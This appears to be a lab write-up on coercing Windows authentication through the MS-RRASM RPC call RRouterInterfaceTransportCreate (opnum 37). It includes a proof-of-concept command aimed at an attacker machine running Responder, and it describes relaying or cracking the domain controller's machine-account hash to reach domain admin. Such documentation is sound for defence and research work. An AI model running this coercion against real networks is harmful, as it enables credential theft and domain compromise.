# MS-RRASM - Remote call to RRouterInterfaceTransportCreate (opnum 37)

## Summary

+ **Protocol**: [[MS-RRASM]: Routing and Remote Access Server (RRAS) Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/a1e2840d-c9ff-4407-abf4-17aa6af34112)

+ **Protocol UUID**: 8f09f000-b7ed-11ce-bbd2-00001a181cad

+ **Protocol version**: 0.0

+ **SMB Named pipe**: `\PIPE\ROUTER`

+ **Function name**: [`RRouterInterfaceTransportCreate`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/9829344c-f22b-4d53-946b-20542ec43be4)

+ **Function operation number**: `37`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\ROUTER` and bind to the desired [`MS-RRASM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/a1e2840d-c9ff-4407-abf4-17aa6af34112) protocol (with uuid `8f09f000-b7ed-11ce-bbd2-00001a181cad` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-RRASM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/a1e2840d-c9ff-4407-abf4-17aa6af34112) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\ROUTER` This pipe is connected to the protocol [[MS-RRASM]: Routing and Remote Access Server (RRAS) Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/a1e2840d-c9ff-4407-abf4-17aa6af34112) and allows to call RPC functions of this protocol. We will then call the remote [`RRouterInterfaceTransportCreate`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/9829344c-f22b-4d53-946b-20542ec43be4) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
RRouterInterfaceTransportCreate('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD RRouterInterfaceTransportCreate(
   [in] DIM_HANDLE hDimServer,
   [in] DWORD dwTransportId,
   [in, string] LPWSTR lpwsTransportName,
   [in] PDIM_INTERFACE_CONTAINER pInfoStruct,
   [in, string] LPWSTR lpwsDLLPath
 );
```

## References

+ Documentation of protocol [MS-RRASM]: Routing and Remote Access Server (RRAS) Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/a1e2840d-c9ff-4407-abf4-17aa6af34112

+ Documentation of function `RRouterInterfaceTransportCreate`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/9829344c-f22b-4d53-946b-20542ec43be4